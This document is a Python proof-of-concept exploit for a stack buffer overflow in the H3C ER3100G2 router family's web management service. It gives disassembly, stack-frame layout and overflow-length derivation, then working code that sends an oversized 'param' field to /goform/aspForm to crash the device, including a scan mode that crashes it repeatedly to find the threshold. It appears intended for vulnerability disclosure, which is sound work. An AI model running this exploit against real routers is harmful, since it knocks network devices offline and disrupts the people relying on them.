#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC #01 — H3C ER3100G2 Buffer Overflow
         /goform/aspForm · AddIKEProposalList · param parameter stack buffer overflow

Vuln ID             : CNNVD-YYYYMM-NNNN (TBD) / CVE-XXXX-XXXXX (TBD)
Vulnerability title : H3C ER3100G2 Buffer Overflow Vulnerability
Vendor / Models     : H3C ER3100G2, ER3200G2, ER3260G2, ER5100G2, ER5200G2, ER6300G2, ER8300G2, ER8300G2-X
Affected version    : ERHMG2-MNW100-R1123 and earlier (fixed in ERHMG2-MNW100-R1126)
Vulnerability type  : CWE-121 stack-based buffer overflow / CWE-787 out-of-bounds write
CVSS 3.1            : 4.9  CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H
Severity            : MEDIUM
Attack prerequisite : A valid authenticated Web management session (Cookie: JSESSIONID=...)
Affected component  : /bin/webs (ELF 32-bit MSB, MIPS N32, MD5 9f33f9956c9839419991fb252e8364fc)
Handler function    : AddIKEProposalList  @ vaddr 0x10050974 (file offset 0x50974)

========  D A N G E R  ========
This PoC crashes the Web management service and may trigger a watchdog reset of the device. It is a destructive operation.
Use it ONLY on devices you own or have explicit written authorization to test.
================================

-------- Principle: value retrieval (no length check) --------
    getElement(body, "param", "")  —— the returned value is used as-is; the length is never checked

    100509a8:  0c005d00   jal      10017400 <memset@plt>
    100509ac:  00000000   nop      
    100509b0:  8fc40410   lw       a0,1040(s8)
    100509b4:  3c02101a   lui      v0,0x101a
    100509b8:  24459328   addiu    a1,v0,-27864
    100509bc:  3c02101a   lui      v0,0x101a
    100509c0:  24469330   addiu    a2,v0,-27856
    100509c4:  0c02d326   jal      100b4c98 <error@@Base+0xe3d8>   <<<
    100509c8:  00000000   nop      
    100509cc:  afc20000   sw       v0,0(s8)
    100509d0:  8fc20000   lw       v0,0(s8)

-------- Principle: the copy (overflow point) --------
    sprintf(dest, ...)  —— src is the fully attacker-controlled param field

    10050a14:  8fc20004   lw       v0,4(s8)
    10050a18:  080142a3   j        10050a8c <takepid@@Base+0xab68>
    10050a1c:  00000000   nop      
    10050a20:  27c20010   addiu    v0,s8,16
    10050a24:  0040202d   move     a0,v0
    10050a28:  3c02101a   lui      v0,0x101a
    10050a2c:  24459358   addiu    a1,v0,-27816
    10050a30:  24060001   li       a2,1
    10050a34:  8fc70000   lw       a3,0(s8)
    10050a38:  0c005c14   jal      10017050 <sprintf@plt>   <<<
    10050a3c:  00000000   nop      
    10050a40:  8fc30008   lw       v1,8(s8)

-------- Stack frame layout --------
Stack frame layout (frame 1072 bytes, buffer at sp+16, size 1024 bytes):

    sp+16     +--------------------------------+
             |                                |
             |    destination buffer (1024 bytes) |   <== overflow write target
             |    sp+16 .. sp+1039
             |                                |
    sp+1040   +--------------------------------+
    sp+1056   +--------------------------------+   saved s8  (frame pointer)
    sp+1064   +--------------------------------+   saved ra  (return address)  <== overwritten -> jr ra jumps wild
    sp+1072   = end of stack frame

-------- Threshold derivation --------
output   = sprintf(dest, "%d;%s", op, param)   =>  "1;" + param
output length = len(param) + 2
absolute offset of the last written byte = 16 + (len(param)+1) = len(param) + 17

overwrites saved s8 (sp+1056):  len(param) + 17 >= 1056   =>  len(param) >= 1039
overwrites saved ra (sp+1064):  len(param) + 17 >= 1064   =>  len(param) >= 1047

-------- Payload construction rules --------
The whole 'param' field is copied into the destination buffer; no separator is required.

-------- Usage --------
    # send once (default length = threshold + 53 bytes, guaranteed to overflow)
    python3 poc_01_AddIKEProposalList.py --host 192.168.1.1 --cookie "JSESSIONID=..."

    # print the raw HTTP request that would be sent; no network traffic (usable directly as submission evidence)
    python3 poc_01_AddIKEProposalList.py --host 192.168.1.1 --cookie "JSESSIONID=..." --dry-run

    # binary-search the minimum triggering length (each probe may reboot the device, so make sure you can recover out-of-band)
    python3 poc_01_AddIKEProposalList.py --host 192.168.1.1 --cookie "JSESSIONID=..." --scan

"""

import argparse
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


# ====================== # ====================== Fixed parameters for this vulnerability (do not edit) ====================== ======================
VULN_SEQ   = "01"
VULN_TITLE = "H3C ER3100G2 Buffer Overflow Vulnerability"
VULN_ENTRY = "AddIKEProposalList"
CMD        = "AddIKEProposalList"
FIELD      = "param"
STYLE      = "whole"
GO_FIELD   = "vpn_ike_proposal.asp"
THRESHOLD  = 1047
BUF_OFFSET = 16
BUF_SIZE   = 1024
STACK_FRAME= 1072
SAVED_FP   = 1056
SAVED_RA   = 1064
HANDLER_VA = "0x10050974"
HANDLER_OFF= "0x50974"
COPY_FN    = "sprintf"
WEBS_MD5   = "9f33f9956c9839419991fb252e8364fc"
VALID_PARAM= "0;1;3des-md5-modp1024"
TIMEOUT    = 10.0
UA         = "Mozilla/5.0 (compatible; PoC-Verification/1.0)"
# ========================================================================

# margin of the overflow object over the threshold; by default 53 bytes past the threshold
DEFAULT_MARGIN = 53

# # ---------------------------------------------------------------- user-facing strings
L = {'len_split': "total 'param' length = {n} bytes (threshold {t}); the remainder after the first ';' "
              '= {n2} bytes — that remainder is the object copied into the destination buffer',
 'len_field': "'{f}' field length = {n} bytes (threshold {t}); the field as a whole is the "
              'overflow object',
 'len_param': "'param' field length = {n} bytes (threshold {t}); the field as a whole is the "
              'overflow object',
 'banner_sep': '==========================================================================',
 'banner1': ' PoC #{seq} — {title}',
 'banner2': ' Target     : POST /goform/aspForm   entry={entry}',
 'banner3': ' Field      : {field}    minimum triggering length: {thr} bytes',
 'banner4': ' Buffer     : {buf} / {size} bytes   handler {fn}',
 'banner5': " For devices you own or are authorized to test only; this will crash the device's Web "
            'service.',
 'help_host': 'device management address, e.g. 192.168.1.1',
 'help_cookie': 'authenticated session cookie, e.g. JSESSIONID=xxxx',
 'help_len': 'length of the overflow object (default {v} = threshold + margin)',
 'help_ssl': 'use HTTPS',
 'help_dry': 'print the raw HTTP request without sending it',
 'help_scan': 'binary-search the minimum triggering length',
 'help_lo': 'lower bound of the scan',
 'help_hi': 'upper bound of the scan (default: threshold + 64)',
 'desc': 'H3C ER G2 /goform/aspForm buffer overflow PoC #{seq} ({cmd})',
 'print_too_short': '[!] length {n} is below the threshold {t}; the overflow is not expected to '
                    'trigger.',
 'print_req_hdr': '----- raw HTTP request that will be sent -----',
 'print_req_end': '----- end -----',
 'print_sending': '[*] sending the crafted request (overflow object length {n} bytes)...',
 'print_http': '[*] HTTP status : {s}  ({d:.2f}s)',
 'print_resp': '[*] first 200 bytes of the response: {b}',
 'print_wait': '[*] waiting 3 s, then checking whether the service is still alive ...',
 'print_alive': '[!] The Web service is still online — no crash observed.',
 'print_alive_why': '    Possible causes: length below the threshold / invalid session / request '
                    'filtered / extra validation in place.',
 'print_down': '[+] The Web service is unreachable — crash reproduced (DoS).',
 'print_down_why': '    Confirm out-of-band (Console/SSH) whether the device performed a watchdog '
                   'reset.',
 'scan_head': "[*] binary search over the '{f}' field length range [{lo}, {hi}]",
 'scan_warn': '[!] Every probe may reboot the device; make sure you can recover out-of-band.',
 'scan_probe': '  probing length {n} ... ',
 'scan_crash': 'crash',
 'scan_alive': 'alive',
 'scan_none': '[-] No crash observed within the range [{lo}, {hi}].',
 'scan_min': '[+] minimum triggering length is about {n} bytes (static derivation: {t})',
 'ellipsis': '  ...<{} bytes of padding omitted>...  '}


def build_overflow_payload(total_len: int) -> str:
    """Build an overflow payload of exactly total_len bytes (no NUL).

    STYLE == "whole": the whole 'param' field is copied, so it is filled directly.
    STYLE == "split": 'param' is first split on ';'; the entire remainder is the overflow object.
    STYLE == "field": the CMD/GO field itself overflows; 'param' may stay valid."""
    # # STYLE == "whole": the whole 'param' field is copied, so it is filled directly.
    # # STYLE == "split": 'param' is first split on ';'; the entire remainder is the overflow object.
    # # STYLE == "field": the CMD/GO field itself overflows; 'param' may stay valid.
    if STYLE == "split":
        head = "0;"
        if total_len <= len(head):
            return head[:total_len]
        return head + "A" * (total_len - len(head))
    return "A" * total_len


def build_fields(total_len: int):
    """Build the POST form fields. --len is the length of the overflow object."""
    fields = []
    if FIELD == "CMD":
        fields.append(("CMD", build_overflow_payload(total_len)))
    else:
        fields.append(("CMD", CMD))
    if FIELD == "GO":
        fields.append(("GO", build_overflow_payload(total_len)))
    else:
        fields.append(("GO", GO_FIELD))
    if FIELD == "param":
        fields.append(("param", build_overflow_payload(total_len)))
    else:
        fields.append(("param", VALID_PARAM))
    return fields


def http_post(host, path, body: bytes, cookie: str, use_ssl: bool, timeout=TIMEOUT):
    """Send a POST request; returns (http_status, first bytes of the response or an error description)."""
    scheme = "https" if use_ssl else "http"
    url = "{}://{}{}".format(scheme, host, path)
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", UA)
    if cookie:
        req.add_header("Cookie", cookie)
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read(4096)
    except urllib.error.HTTPError as e:
        return e.code, e.read(4096)
    except Exception as e:
        return None, str(e).encode()


def alive(host, cookie, use_ssl=False):
    """Check whether the Web service is still alive (GET the login page)."""
    scheme = "https" if use_ssl else "http"
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request("{}://{}/userLogin.asp".format(scheme, host))
    req.add_header("User-Agent", UA)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as resp:
            resp.read(1024)
            return True
    except urllib.error.HTTPError:
        return True
    except Exception:
        return False


def send(host, total_len, cookie, use_ssl=False):
    """Send one crafted request; returns (http_status, response snippet, elapsed seconds, raw request body)."""
    fields = build_fields(total_len)
    body = urllib.parse.urlencode(fields, encoding="utf-8").encode()
    t0 = time.time()
    status, snippet = http_post(host, "/goform/aspForm", body, cookie, use_ssl)
    return status, snippet, time.time() - t0, body


def raw_request_text(host, cookie, total_len, use_ssl=False):
    """Build the raw HTTP request that would be sent (used by --dry-run)."""
    fields = build_fields(total_len)
    body = urllib.parse.urlencode(fields, encoding="utf-8").encode()
    lines = [
        "POST /goform/aspForm HTTP/1.1",
        "Host: {}".format(host),
        "Content-Type: application/x-www-form-urlencoded",
        "User-Agent: {}".format(UA),
    ]
    if cookie:
        lines.append("Cookie: {}".format(cookie))
    lines.append("Content-Length: {}".format(len(body)))
    lines.append("")
    text = body.decode("utf-8", "replace")
    if len(text) > 400:
        text = text[:200] + L["ellipsis"].format(len(text) - 400) + text[-200:]
    lines.append(text)
    return "\n".join(lines)


def describe_length(n: int) -> str:
    """Describe the length semantics precisely: in 'split' mode the overflow object is the remainder after the separator, 2 bytes shorter than the field itself."""
    if STYLE == "split":
        return L["len_split"].format(n=n, t=THRESHOLD, n2=n - 2)
    if STYLE == "field":
        return L["len_field"].format(f=FIELD, n=n, t=THRESHOLD)
    return L["len_param"].format(n=n, t=THRESHOLD)


def print_banner():
    print(L["banner_sep"])
    print(L["banner1"].format(seq=VULN_SEQ, title=VULN_TITLE))
    print(L["banner2"].format(entry=VULN_ENTRY))
    print(L["banner3"].format(field=FIELD, thr=THRESHOLD))
    print(L["banner4"].format(
        buf=("sp+" + str(BUF_OFFSET)) if isinstance(BUF_OFFSET, int) else BUF_OFFSET,
        size=BUF_SIZE, fn=HANDLER_VA))
    print(L["banner_sep"])
    print(L["banner5"])
    print()


def main():
    p = argparse.ArgumentParser(
        description=L["desc"].format(seq=VULN_SEQ, cmd=CMD),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--host", required=True, help=L["help_host"])
    p.add_argument("--cookie", default="", help=L["help_cookie"])
    p.add_argument("--len", dest="length", type=int, default=THRESHOLD + DEFAULT_MARGIN,
                   help=L["help_len"].format(v=THRESHOLD + DEFAULT_MARGIN))
    p.add_argument("--ssl", action="store_true", help=L["help_ssl"])
    p.add_argument("--dry-run", action="store_true", help=L["help_dry"])
    p.add_argument("--scan", action="store_true", help=L["help_scan"])
    p.add_argument("--scan-lo", type=int, default=32, help=L["help_lo"])
    p.add_argument("--scan-hi", type=int, default=None, help=L["help_hi"])
    args = p.parse_args()

    print_banner()

    if args.length < THRESHOLD:
        print(L["print_too_short"].format(n=args.length, t=THRESHOLD) + "\n")

    if args.dry_run:
        print(L["print_req_hdr"])
        print(raw_request_text(args.host, args.cookie, args.length, args.ssl))
        print(L["print_req_end"])
        print(describe_length(args.length))
        return 0

    if args.scan:
        hi = args.scan_hi if args.scan_hi is not None else THRESHOLD + 64
        lo = max(args.scan_lo, 32)
        print(L["scan_head"].format(f=FIELD, lo=lo, hi=hi))
        print(L["scan_warn"])
        crashed = None
        while lo <= hi:
            mid = (lo + hi) // 2
            sys.stdout.write(L["scan_probe"].format(n=mid))
            sys.stdout.flush()
            send(args.host, mid, args.cookie, args.ssl)
            time.sleep(1.5)
            if not alive(args.host, args.cookie, args.ssl):
                crashed = mid
                print(L["scan_crash"])
                hi = mid - 1
            else:
                print(L["scan_alive"])
            time.sleep(1)
        print()
        if crashed is None:
            print(L["scan_none"].format(lo=args.scan_lo, hi=hi))
            return 1
        print(L["scan_min"].format(n=crashed, t=THRESHOLD))
        return 0

    print(L["print_sending"].format(n=args.length))
    status, snippet, dt, _body = send(args.host, args.length, args.cookie, args.ssl)
    print(L["print_http"].format(s=status, d=dt))
    if snippet:
        print(L["print_resp"].format(b=snippet[:200]))
    print(L["print_wait"])
    time.sleep(3)
    if alive(args.host, args.cookie, args.ssl):
        print(L["print_alive"])
        print(L["print_alive_why"])
        return 1
    print(L["print_down"])
    print(L["print_down_why"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
